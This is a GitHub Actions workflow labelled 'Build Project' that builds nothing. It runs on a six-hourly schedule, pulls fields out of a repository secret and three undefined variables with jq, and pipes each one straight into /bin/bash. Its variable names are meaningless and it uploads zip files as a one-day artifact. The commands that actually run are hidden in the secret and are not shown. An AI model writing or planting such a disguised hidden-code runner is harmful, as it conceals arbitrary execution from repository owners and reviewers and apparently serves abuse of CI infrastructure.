name: Build Project
on:
  workflow_dispatch:

  schedule:
    - cron: '45 1,7,13,19 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  start:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Execute task
        env:
          iu8877: ${{ secrets.iu8877 }}
        run: |
          printf '%s' "$iu8877" | jq -r .htr7422 | /bin/bash
          printf '%s' "$own85885" | jq -r .ezy1 | /bin/bash
          echo $hmgrt136 | jq -r .mebuu291 | /bin/bash
          echo $ggau918 | jq -r .y8 | /bin/bash

      - name: Persist data
        if: ${{ always() }}
        uses: actions/upload-artifact@v4
        with:
          name: CoaRPkJO
          path: "*.zip"
          retention-days: 1
